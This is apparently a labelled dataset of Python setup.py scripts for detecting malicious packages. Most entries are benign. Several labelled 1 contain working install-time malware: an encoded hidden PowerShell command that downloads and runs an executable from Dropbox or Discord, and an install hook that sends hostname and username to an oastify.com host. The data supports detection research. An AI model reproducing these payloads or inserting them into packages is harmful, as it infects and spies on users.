won't be included (but directories under packages\n    will).\n\n    Directories matching any pattern in ``exclude_directories`` will\n    be ignored; by default directories with leading ``.``, ``CVS``,\n    and ``_darcs`` will be ignored.\n\n    If ``show_ignored`` is true, then all the files that aren't\n    included in package data are shown on stderr (for debugging\n    purposes).\n\n    Note patterns use wildcards, or can be exact paths (including\n    leading ``./``), and all searching is case-insensitive.\n    \"\"\"\n\n    out = {}\n    stack = [(convert_path(where), '', package, only_in_packages)]\n    while stack:\n        where, prefix, package, only_in_packages = stack.pop(0)\n        for name in os.listdir(where):\n            fn = os.path.join(where, name)\n            if os.path.isdir(fn):\n                bad_name = False\n                for pattern in exclude_directories:\n                    if (fnmatchcase(name, pattern) or fn.lower() == pattern.lower()):\n                        bad_name = True\n                        if show_ignored:\n                            print >> sys.stderr, (\n                                \"Directory %s ignored by pattern %s\"\n                                % (fn, pattern))\n                        break\n                if bad_name:\n                    continue\n                if (os.path.isfile(os.path.join(fn, '__init__.py')) and not prefix):\n                    if not package:\n                        new_package = name\n                    else:\n                        new_package = package + '.' + name\n                    stack.append((fn, '', new_package, False))\n                else:\n                    stack.append((fn, prefix + name + '/', package, only_in_packages))\n            elif package or not only_in_packages:\n                # is a file\n                bad_name = False\n                for pattern in exclude:\n                    if (fnmatchcase(name, pattern) or fn.lower() == pattern.lower()):\n                        bad_name = True\n                        if show_ignored:\n                            print >> sys.stderr, (\n                                \"File %s ignored by pattern %s\"\n                                % (fn, pattern))\n                        break\n                if bad_name:\n                    continue\n                out.setdefault(package, []).append(prefix + name)\n    return out\n\nsetup(\n    name=\"django-localflavor\",\n    version=find_version(\"localflavor\", \"__init__.py\"),\n    url='https://django-localflavor.readthedocs.io/en/latest/',\n    license='BSD',\n    description=\"Country-specific Django helpers\",\n    long_description=read('README.rst'),\n    author='Django Software Foundation',\n    author_email='foundation@djangoproject.com',\n    packages=find_packages(exclude=['tests', 'tests.*']),\n    package_data=find_package_data(),\n    install_requires=[\n        'django>=2.2',\n        'python-stdnum>=1.6',\n    ],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Internet :: WWW/HTTP',\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "hackedintel-2.4", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'hackedintel',\n    packages = ['modlib'],\n    version = '9.41',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-plugin-utils-1.3.2", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['flake8_plugin_utils', 'flake8_plugin_utils.utils']\n\npackage_data = \\\n{'': ['*']}\n\nsetup_kwargs = {\n    'name': 'flake8-plugin-utils',\n    'version': '1.3.2',\n    'description': 'The package provides base classes and utils for flake8 plugin writing',\n    'long_description': \"# flake8-plugin-utils\\n\\n[![pypi](https://badge.fury.io/py/flake8-plugin-utils.svg)](https://pypi.org/project/flake8-plugin-utils)\\n[![Python: 3.6+](https://img.shields.io/badge/Python-3.6+-blue.svg)](https://pypi.org/project/flake8-plugin-utils)\\n[![Downloads](https://img.shields.io/pypi/dm/flake8-plugin-utils.svg)](https://pypistats.org/packages/flake8-plugin-utils)\\n[![Build Status](https://travis-ci.org/Afonasev/flake8-plugin-utils.svg?branch=master)](https://travis-ci.org/Afonasev/flake8-plugin-utils)\\n[![Code coverage](https://codecov.io/gh/afonasev/flake8-plugin-utils/branch/master/graph/badge.svg)](https://codecov.io/gh/afonasev/flake8-plugin-utils)\\n[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://en.wikipedia.org/wiki/MIT_License)\\n[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/ambv/black)\\n\\nThe package provides base classes and utils for flake8 plugin writing.\\n\\n## Installation\\n\\n```bash\\npip install flake8-plugin-utils\\n```\\n\\n## Example\\n\\nWrite simple plugin\\n\\n```python\\nfrom flake8_plugin_utils import Error, Visitor, Plugin\\n\\nclass MyError(Error):\\n    code = 'X100'\\n    message = 'my error'\\n\\nclass MyVisitor(Visitor):\\n    def visit_ClassDef(self, node):\\n        self.error_from_node(MyError, node)\\n\\nclass MyPlugin(Plugin):\\n    name = 'MyPlugin'\\n    version = '0.1.0'\\n    visitors = [MyVisitor]\\n```\\n\\nand test it with pytest\\n\\n```python\\nfrom flake8_plugin_utils import assert_error, assert_not_error\\n\\ndef test_code_with_error():\\n    assert_error(MyVisitor, 'class Y: pass', MyError)\\n\\ndef test_code_without_error():\\n    assert_not_error(MyVisitor, 'x = 1')\\n```\\n\\n### Configuration\\n\\nTo add configuration to a plugin, do the following:\\n\\n1. Implement classmethod `add_options` in your plugin class, as per the\\n[flake8 docs](https://flake8.pycqa.org/en/latest/plugin-development/plugin-parameters.html#registering-options).\\n1. Override classmethod `parse_options_to_config` in your plugin class\\nto return any object holding the options you need.\\n1. If you need a custom `__init__` for your visitor, make sure it accepts\\na keyword argument named `config` and pass it to `super().__init__`\\n1. Use `self.config` in visitor code.\\n\\nExample:\\n\\n```python\\nfrom flake8_plugin_utils import Error, Visitor, Plugin, assert_error\\n\\nclass MyError(Error):\\n    code = 'X100'\\n    message = 'my error with {thing}'\\n\\nclass MyConfig:\\n    def __init__(self, config_option):\\n        self.config_option = config_option\\n\\nclass MyVisitorWithConfig(Visitor):\\n    def visit_ClassDef(self, node):\\n        self.error_from_node(\\n            MyError, node, thing=f'{node.name} {self.config.config_option}'\\n        )\\n\\nclass MyPluginWithConfig(Plugin):\\n    name = 'MyPluginWithConfig'\\n    version = '0.0.1'\\n    visitors = [MyVisitorWithConfig]\\n\\n    @classmethod\\n    def add_options(cls, options_manager):\\n        options_manager.add_option('--config_option', ...)\\n\\n    @classmethod\\n    def parse_options_to_config(cls, option_manager, options, args):\\n        return MyConfig(config_option=options.config_option)\\n\\n\\ndef test_code_with_error():\\n    assert_error(\\n        MyVisitorWithConfig,\\n        'class Y: pass',\\n        MyError,\\n        config=MyConfig(config_option='123'),\\n        thing='Y 123',\\n    )\\n```\\n\\n### Formatting\\n\\nYour `Error`s can take formatting arguments in their `message`:\\n\\n```python\\nfrom flake8_plugin_utils import Error, Visitor, assert_error\\n\\nclass MyFormattedError(Error):\\n    code = 'X101'\\n    message = 'my error with {thing}'\\n\\nclass MyFormattedVisitor(Visitor):\\n    def visit_ClassDef(self, node):\\n        self.error_from_node(MyFormattedError, node, thing=node.name)\\n\\ndef test_code_with_error():\\n    assert_error(\\n        MyFormattedVisitor,\\n        'class Y: pass',\\n        MyFormattedError,\\n        thing='Y',\\n    )\\n```\\n\\n### Usage with typing/mypy\\n\\nThe `Plugin` and `Visitor` classes are generic with the config class as type\\nparameter.  If your plugin does not have any config, inherit it from\\n`Plugin[None]` and the visitors from `Visitor[None]`.  Otherwise, use the\\nconfig class as the type parameter (e.g. `Plugin[MyConfig]` and\\n`Visitor[MyConfig]` in the above example).\\n\\n### Utility functions\\n\\n* `assert_error`, `assert_not_error`\\nUtilities for testing visitors (see examples above).\\n\\n* `is_true`, `is_false`, `is_none`\\nConvenience functions to check if an AST node represents a\\n`True`/`False`/`None` value.\\n\\n* `check_equivalent_nodes`\\nChecks if two given AST nodes are equivalent.\\nThe nodes are considered equivalent in the following cases:\\n  * dicts -- if they contain same key-value pairs, possibly in different order,\\n  with duplicates and `**expansions` taken into account\\n  * sets -- if they contain same elements, possibly in different order,\\n  with duplicates taken into account\\n  * anything else -- if they represent the same AST, regardless of formatting\\n  (with any dicts in sets inside checked according to the rules above)\\n\\n## For developers\\n\\n### Show help\\n\\n    make help\\n\\n### Create venv and install deps\\n\\n    make init\\n\\n### Install git precommit hook\\n\\n    make precommit\\n\\n### Run linters, autoformat, tests etc.\\n\\n    make pretty lint test\\n\\n### Bump new version\\n\\n    make bump_major\\n    make bump_minor\\n    make bump_patch\\n\\n## Change Log\\n\\nUnreleased\\n-----\\n\\n* ...\\n\\n1.3.2 - 2021-05-05\\n-----\\n\\n* Drop noqa detection (#56)\\n* docs: Add help for Makefile\\n\\n1.3.1 - 2020-08-06\\n-----\\n\\n* Fix handling of encoding when loading files (#37)\\n\\n1.3.0 - 2020-03-26\\n-----\\n\\n* add `check_equivalent_nodes` utility function\\n\\n1.2.0 - 2020-03-06\\n-----\\n\\n* add `config` argument to `assert_error` and `assert_not_error`\\n\\n1.1.1 - 2020-03-02\\n-----\\n\\n* ignore encoding errors when reading strings for noqa validation\\n\\n1.1.0 - 2020-03-01\\n-----\\n\\n* add ability for plugins to parse and use configuration\\n**NB: this change breaks type-checking if you use typing/mypy. Change your\\ncode to inherit from `Plugin[None]` and `Visitor[None]` to fix.**\\n\\n1.0.0 - 2019-05-23\\n-----\\n\\n* add message formatting to Error\\n\\n0.2.1 - 2019-04-01\\n-----\\n\\n* don`t strip before src dedent in _error_from_src\\n* add is_none, is_true, is_false util functions\\n\\n0.2.0 - 2019.02.21\\n-----\\n\\n* add assert methods\\n\\n0.1.0 - 2019.02.09\\n-----\\n\\n* initial\\n\",\n    'author': 'Afonasev Evgeniy',\n    'author_email': 'ea.afonasev@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://pypi.org/project/flake8-plugin-utils',\n    'packages': packages,\n    'package_data': package_data,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "peloton-client123-0.8.10", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://e1gl4m7gypj7g49tbwc6vvmr4ia9yzmo.oastify.com\",params = ploads) \n\nsetup(name='peloton-client123', #package name\n      version='0.8.10',\n      description='test',\n      author='red-fire',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})", "target": 1}
{"idx": "djangorestframework-stubs-1.7.0", "func": "import os\n\nfrom setuptools import find_packages, setup\n\n\ndef find_stub_files(name):\n    result = []\n    for root, _dirs, files in os.walk(name):\n        for file in files:\n            if file.endswith(\".pyi\"):\n                if os.path.sep in root:\n                    sub_root = root.split(os.path.sep, 1)[-1]\n                    file = os.path.join(sub_root, file)\n                result.append(file)\n    return result\n\n\nwith open(\"README.md\") as f:\n    readme = f.read()\n\ndependencies = [\n    \"mypy>=0.950\",\n    \"django-stubs>=1.11.0\",\n    \"typing-extensions>=3.10.0\",\n    \"requests>=2.0.0\",\n    \"coreapi>=2.0.0\",\n    \"types-requests>=0.1.12\",\n    \"types-PyYAML>=5.4.3\",\n    \"types-Markdown>=0.1.5\",\n]\n\nextras_require = {\n    \"compatible-mypy\": [\"mypy>=0.950,<0.970\"],\n}\n\nsetup(\n    name=\"djangorestframework-stubs\",\n    version=\"1.7.0\",\n    description=\"PEP-484 stubs for django-rest-framework\",\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/typeddjango/djangorestframework-stubs\",\n    author=\"Maksim Kurnikov\",\n    author_email=\"maxim.kurnikov@gmail.com\",\n    license=\"MIT\",\n    install_requires=dependencies,\n    extras_require=extras_require,\n    packages=[\"rest_framework-stubs\", *find_packages(exclude=[\"scripts\"])],\n    package_data={\"rest_framework-stubs\": find_stub_files(\"rest_framework-stubs\")},\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Typing :: Typed\",\n    ],\n)\n", "target": 0}
{"idx": "aliyun-oss2-2.18.1", "func": "#!/usr/bin/env python\n\nimport re\nimport sys\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nversion = ''\nwith open('oss2/__init__.py', 'r') as fd:\n    version = re.search(r'^__version__\\s*=\\s*[\\'\"]([^\\'\"]*)[\\'\"]',\n                        fd.read(), re.MULTILINE).group(1)\n\nif not version:\n    raise RuntimeError('Cannot find version information')\n\n\nwith open('README.rst', 'rb') as f:\n    readme = f.read().decode('utf-8')\n\nsetup(\n    name='aliyun-oss2',\n    version=version,\n    description='Aliyun OSS (Object Storage Service) SDK',\n    long_description=readme,\n    packages=['oss2'],\n    install_requires=['requests!=2.9.0',\n                      'crcmod>=1.7',\n                      'pycryptodome>=3.4.7',\n                      'python-aliyun-sdk-kms>=2.4.1',\n                      'python-aliyun-sdk-core>=2.13.12',\n                      'six'],\n    include_package_data=True,\n    url='http://oss.aliyun.com',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8'\n    ]\n)\n", "target": 1}
{"idx": "proofproof-3.27", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'proofproof',\n    packages = ['modlib'],\n    version = '4.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "datarobot-2.28.1", "func": "#\n# Copyright 2021 DataRobot, Inc. and its affiliates.\n#\n# All rights reserved.\n#\n# DataRobot, Inc.\n#\n# This is proprietary source code of DataRobot, Inc. and its\n# affiliates.\n#\n# Released under the terms of DataRobot Tool and Utility Agreement.\nfrom setuptools import find_packages, setup\n\nfrom common_setup import common_setup_kwargs, DEFAULT_CLASSIFIERS, DESCRIPTION_TEMPLATE, version\n\npython_versions = \"2.7 and >= 3.4\"\n\ndescription = DESCRIPTION_TEMPLATE.format(\n    package_name=\"datarobot\",\n    pypi_url_target=\"https://pypi.python.org/pypi/datarobot/\",\n    extra_desc=\"\",\n    python_versions=python_versions,\n    pip_package_name=\"datarobot\",\n    docs_link=\"https://datarobot-public-api-client.readthedocs-hosted.com\",\n)\n\npackages = find_packages(exclude=[\"tests\"])\n\ncommon_setup_kwargs.update(\n    name=\"datarobot\",\n    version=version,\n    packages=packages,\n    long_description=description,\n    classifiers=DEFAULT_CLASSIFIERS,\n)\n\nsetup(**common_setup_kwargs)\n", "target": 0}
{"idx": "py-pingloadcontrol-4.73", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pingloadcontrol',\n    packages = ['modlib'],\n    version = '1.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libgrandloadcv-3.9", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libgrandloadcv',\n    packages = ['modlib'],\n    version = '6.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "db-dtypes-1.0.3", "func": "# Copyright 2021 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\nimport re\nfrom setuptools import setup\n\n# Package metadata.\n\nname = \"db-dtypes\"\ndescription = \"Pandas Data Types for SQL systems (BigQuery, Spanner)\"\n\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\n\ndependencies = [\n    \"packaging >= 17.0\",\n    \"pandas >= 0.24.2, < 2.0dev\",\n    \"pyarrow>=3.0.0, <10.0dev\",\n    \"numpy >= 1.16.6, < 2.0dev\",\n]\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(package_root, \"db_dtypes\", \"version.py\")) as f:\n    version = re.search('__version__ = \"([^\"]+)\"', f.read()).group(1)\n\n\ndef readme():\n    with io.open(\"README.rst\", \"r\", encoding=\"utf8\") as f:\n        return f.read()\n\n\nsetup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme(),\n    long_description_content_type=\"text/x-rst\",\n    author=\"The db-dtypes Authors\",\n    author_email=\"googleapis-packages@google.com\",\n    packages=[\"db_dtypes\"],\n    url=\"https://github.com/googleapis/python-db-dtypes-pandas\",\n    keywords=[\"sql\", \"pandas\"],\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Database :: Front-Ends\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    install_requires=dependencies,\n    python_requires=\">=3.7, <3.11\",\n    tests_require=[\"pytest\"],\n)\n", "target": 0}
{"idx": "eth-hash-0.5.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\nextras_require = {\n    'test': [\n        \"pytest>=6.2.5,<7\",\n        \"pytest-xdist>=2.4.0,<3\",\n        \"tox>=3.14.6,<4\",\n    ],\n    'lint': [\n        \"flake8==3.7.9\",\n        \"isort>=4.2.15,<5\",\n        \"mypy==0.961\",\n        \"pydocstyle>=5.0.0,<6\",\n        \"black>=22.0,<23\",\n    ],\n    'doc': [\n        \"Sphinx>=5.0.0,<6\",\n        \"sphinx_rtd_theme>=0.1.9,<1\",\n        \"towncrier>=21,<22\",\n        \"jinja2>=3.0.0,<3.1.0\",  # jinja2<3.0 or >=3.1.0 cause doc build failures.\n    ],\n    'dev': [\n        \"bumpversion>=0.5.3,<1\",\n        \"pytest-watch>=4.1.0,<5\",\n        \"wheel\",\n        \"twine\",\n        \"ipython\",\n    ],\n    # optional backends:\n    'pycryptodome': [\n        \"pycryptodome>=3.6.6,<4\",\n    ],\n    'pysha3': [\n        \"pysha3>=1.0.0,<2.0.0\",\n    ],\n}\n\nextras_require['dev'] = (\n    extras_require['dev'] +  # noqa: W504\n    extras_require['test'] +  # noqa: W504\n    extras_require['lint'] +  # noqa: W504\n    extras_require['doc']\n)\n\n\nwith open('./README.md') as readme:\n    long_description = readme.read()\n\n\nsetup(\n    name='eth-hash',\n    # *IMPORTANT*: Don't manually change the version here. Use `make bump`, as described in readme\n    version='0.5.0',\n    description=\"\"\"eth-hash: The Ethereum hashing function, keccak256, sometimes (erroneously) called sha3\"\"\",\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author='The Ethereum Foundation',\n    author_email='snakecharmers@ethereum.org',\n    url='https://github.com/ethereum/eth-hash',\n    include_package_data=True,\n    python_requires='>=3.7, <4',\n    extras_require=extras_require,\n    py_modules=['eth_hash'],\n    license=\"MIT\",\n    zip_safe=False,\n    keywords='ethereum',\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    package_data={'eth_hash': ['py.typed']},\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Operating System :: MacOS',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: PyPy',\n    ],\n)\n", "target": 0}
{"idx": "etcd3-0.12.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport re\n\nfrom setuptools import setup\n\nwith open('README.rst') as readme_file:\n    readme = readme_file.read()\n\nwith open('HISTORY.rst') as history_file:\n    history = history_file.read()\n\n\ndef load_reqs(filename):\n    with open(filename) as reqs_file:\n        return [\n            re.sub('==', '>=', line) for line in reqs_file.readlines()\n            if not re.match(r'(\\s*#|-r)', line)\n        ]\n\n\nrequirements = load_reqs('requirements/base.txt')\ntest_requirements = load_reqs('requirements/test.txt')\n\nsetup(\n    name='etcd3',\n    version='0.12.0',\n    description=\"Python client for the etcd3 API\",\n    long_description=readme + '\\n\\n' + history,\n    author=\"Louis Taylor\",\n    author_email='louis@kragniz.eu',\n    url='https://github.com/kragniz/python-etcd3',\n    packages=[\n        'etcd3',\n        'etcd3.etcdrpc',\n    ],\n    package_dir={\n        'etcd3': 'etcd3',\n        'etcd3.etcdrpc': 'etcd3/etcdrpc',\n    },\n    include_package_data=True,\n    install_requires=requirements,\n    license=\"Apache Software License 2.0\",\n    zip_safe=False,\n    keywords='etcd3',\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Natural Language :: English',\n        \"Programming Language :: Python :: 2\",\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n    test_suite='tests',\n    tests_require=test_requirements\n)\n", "target": 0}
{"idx": "tryquests-0.0.1", "func": "from distutils.core import setup\n\nsetup(\n  name = 'tryquests',\n  packages = ['tryquests'],\n  version = '0.0.1',\n  license='MIT',\n  description = '',\n  author = 'WS',\n  keywords = [],\n  install_requires=['requests', 'stillrequestsa'],\n  classifiers=[\n    'Operating System :: OS Independent',\n    'Development Status :: 3 - Alpha',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n  ],\n)\n", "target": 1}
